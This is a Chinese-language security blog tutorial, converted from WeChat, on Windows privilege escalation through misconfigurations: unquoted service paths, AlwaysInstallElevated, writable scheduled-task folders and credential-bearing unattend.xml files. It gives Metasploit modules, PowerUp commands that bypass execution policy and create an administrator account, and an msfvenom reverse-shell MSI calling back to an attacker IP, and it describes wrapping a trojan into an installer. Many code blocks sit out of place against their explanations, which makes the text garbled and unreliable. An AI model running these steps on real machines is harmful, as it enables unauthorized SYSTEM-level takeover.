> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PIP1iip4yPLjX1kN075sNA)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：TeamsSix  
本文字数：2578

阅读时长：10 ~ 15 分钟

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

  

Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限运行、注册表键 AlwaysInstallElevated 等。

Windows 系统的错误配置除了用来进行提权，还可以用来寻找一些敏感信息，比如在一些安装配置的文件中或许就包含了一些明文账号密码等等。

接下来，简单看看这些错误配置的利用方法。

一、

**_可信任服务路径漏洞_**

可信任服务路径 (Trusted Service Paths) 漏洞利用了 Windows 文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像这样的路径：

```
C:\Program Files\Common Files\WgpSec
```

刚才说到了这个漏洞利用了 Windows 文件路径解析的特性，那我们先来了解一下这个特性。

假如有个文件路径是这样的：

```
C:\Program Files\Common Files\WgpSec\TeamsSix.exe
```

可以看到这个路径中有两个空格，那么对于 Windows 来说，它会尝试找到与空格前名字相匹配的程序，然后执行它。

以上面的 exe 文件路径为例，Windows 会依次尝试执行以下程序：

```
C:\Program.exe
C:\Program Files\Common.exe
C:\Program Files\Common Files\WgpSec\TeamsSix.exe
```

可以看到 Windows 尝试执行了三次才找到真正的程序。

由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。

因此是不是说我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的 TeamsSix.exe 程序重启时，系统就会执行我们的木马程序？

答案是的。

同时如果此时程序以 SYSTEM 运行，那我们就将获得一个 SYSTEM 权限的会话。

铺垫了那么多，现在就来复现一下。

复现
--

我们可以通过下面的命令来查找系统中存在可信任服务路径的程序。

```
wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr/i /v """
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSJ4rPBAer9zkU0ampDodFwWaly167BAIHLeCcdSDdA2cE5GNzB4XLbg/640?wx_fmt=png)

截图中可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。

我们可以直接使用 MSF 利用该漏洞，MSF 版本中利用该漏洞的模块是 trusted_service_path，但是在新版本中该模块的名称已经变更为 unquoted_service_path

```
use windows/local/unquoted_service_path
set session 1
run
```

```
组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSXjKF5WAPMV3zZTfx0smqg43FtbfM87hrib6cOknIV9qdYx4HPFnYDZg/640?wx_fmt=png)

二、

**_注册表_**

注册表 AlwaysInstallElevated 是一个策略设置项。Windows 允许低权限用户以 SYSTEM 权限运行安装文件。

如果启用此策略设置项，那么任何权限的用户都能以 SYSTEM 权限来安装恶意的 MSI（Microsoft Windows Installer）文件。

产生该漏洞的原因是由于用户在策略编辑器中开启了 Windows Installer 特权安装功能。

```
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSLLqC3xkyEQZVD5uQGicCBtydjPGg0z5p9uU7QANl0JtMicqsfNwUVf3w/640?wx_fmt=png)

也可以直接使用命令行开启这两项注册表。

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

然后使用 reg 查看这两项的键值，0x1 表示处于开启状态。

```
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated}"
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSlDEiaIIGhxjMxfVzLRgqmVTLpZps6ntkLumAicDKeywlz1mJ5xytdRVw/640?wx_fmt=png)

复现
--

### PowerUp

PowerUp 下载地址：https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

我们可以使用 PowerUp.ps1 脚本里的 Get-RegistryAlwaysInstallElevated 模块来检查相关注册表是否被设置。

在 PowerShell 中导入并执行脚本

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerUp.ps1;Write-UserAddMSI}"
```

如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用 -exec bypass 进行绕过。

```
msiexec /q /i UserAdd.msi
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSTRiaV5tp2bEItRzfthMNGauI3ajISTh71rIeELZkIdKCEGELcRSn7iaw/640?wx_fmt=png)

返回为 True，表示相关注册表被设置了，也就意味着 MSI 文件是以 SYSTEM 权限运行的。

运行 PowerUp 的 Write-UserAddMSI 模块

```
/quiet：安装过程中禁止向用户发送消息
/qn：不使用GUI
/q：隐藏安装界面
/i：安装程序
```

```
use exploit/windows/local/always_install_elevated
set session 1
run
```

运行完后，会在当前目录下生成一个 UserAdd.msi 程序，此时以普通用户权限执行该 MSI 程序就会创建一个管理员账户。

直接双击或者命令行启动该 MSI 程序。

```
msfvenom -p windows/exec CMD=<命令> -f msi > calc.msi
```

msiexec 参数介绍：

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.65 lport=4444 –f msi -o shell.msi
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPS3G37UtseLZaFRWTgxoekd0Rzm8VHHJtjwYlWAjJ6JAYQxJMIsibzaYA/640?wx_fmt=png)

### MSF

MSF 中可以使用 exploit/windows/local/always_install_elevated 模块，直接获取 SYSTEM 权限。

```
schtasks /query /fo list /v
```

```
.\accesschk.exe /accepteula
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPS38NCnnUzTHofSuhKiasiacn2vibguYy7MviaHl5uIXUE9T9ibhouS8XtWrw/640?wx_fmt=png)

除了上面的操作外，还可以使用 msfvenom 生成 MSI 文件，从而以 SYSTEM 权限执行任意命令。

```
.\accesschk.exe -dqv "C:\Program Files"
```

```
.\accesschk.exe -uwdqs Users c:\ 
.\accesschk.exe -uwdqs "Authenticated Users" c:\
```

或者以 SYSTEM 权限上线

```
.\accesschk.exe -uwqs Users c:\*.*
.\accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

```
C:\sysprep.inf
C:\syspreg\sysprep.xml
C:\Windows\system32\sysprep.inf
C:\windows\system32\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

### MSI Wrapper

MSI Wrapper 是一个操作简单直观的 MSI 安装包生成工具，我们可以使用该工具制作一个包含木马的 MSI 安装包。

选择自己要导入的 EXE 木马文件位置和导出 MSI 安装包位置。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSibic82XMiaWV8OAPT2Z14ibtiaZsuxC0PhRugdQ0wFhAAU5yicQyWYQJsjtQ/640?wx_fmt=png)

设置运行时提升权限

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSlbMWiaScQD5ycna1Zzd35xugu0qlaicosIvibafGN1gq42moZExHnr9Dg/640?wx_fmt=png)

之后 Application Id 随便选一个，其他操作默认就行，然后将 MSI 文件拷贝到目标主机上

开启攻击主机的监听，双击 MSI 文件之后就可以看到回连的会话已经是 SYSTEM 权限了。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSNlAicv4KcZPZew4AGsAabDjbgJ92z7fROicGNSxloyvgksZ8IYK3YmZw/640?wx_fmt=png)

三、

**_计划任务_**








========================

使用以下命令可以看到当前计算机的计划任务

```
dir /b /s C:\Unattend.xml
```

AccessChk 是微软官方提供的一款工具，因此往往不会引起杀软的告警，AccessChk 可用来进行一些系统或程序的高级查询、管理和故障排除工作。

AccessChk 下载地址：https://download.sysinternals.com/files/AccessChk.zip

在第一次使用时，会弹出许可协议对话框，可以使用 /accepteula 进行关闭

```
use post/windows/gather/enum_unattend
set session 1
run
```

执行以下命令，查看指定目录的权限配置情况：

```
.\accesschk.exe -dqv "C:\Program Files"
```

如果攻击者以高权限运行的任务所在目录有写权限，就可以使用恶意程序覆盖原来的程序，这样计划任务下次运行时，就会以高权限运行恶意程序。

列出每个驱动器下所有权限配置不当的文件夹：

```
.\accesschk.exe -uwdqs Users c:\ 
.\accesschk.exe -uwdqs "Authenticated Users" c:\
```

列出每个驱动器下所有权限配置不当的文件：

```
.\accesschk.exe -uwqs Users c:\*.*
.\accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

四、

**_自动安装配置文件_**








============================

管理员在对内网中多台机器进行环境配置时，通常不会一台一台的配置，往往会采用脚本批量化的方式。

在这个过程中，可能就会有一些包含安装配置信息的文件，比如在这些文件中可能就包含了账号、密码，常见的安装配置文件路径如下：

```
C:\sysprep.inf
C:\syspreg\sysprep.xml
C:\Windows\system32\sysprep.inf
C:\windows\system32\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

或者直接全局搜索 Unattend.xml 文件

```
dir /b /s C:\Unattend.xml
```

也可以直接使用 MSF 的 post/windows/gather/enum_unattend 模块

```
use post/windows/gather/enum_unattend
set session 1
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDxSxRwGCcL83N9npI7KpPSuxvtPN0dU5FqNWSbCs5iadIX82I4dJJdWU3Gxf9KPXxYUic4Vg8vlfew/640?wx_fmt=png)

  

**_后记_**

  

参考文章：

https://www.freebuf.com/articles/SYSTEM/254836.html

https://www.freebuf.com/articles/network/250827.html

https://gist.github.com/sckalath/8dacd032b65404ef7411

  

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzD99wIG8C84pibZvicNHnXlCNn54ict2OL3qnu1rbR91kaOp8TZG5N8uBja7QibYJwYHFnBBPDwQfwhwQ/640?wx_fmt=png)

TeamsSix

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)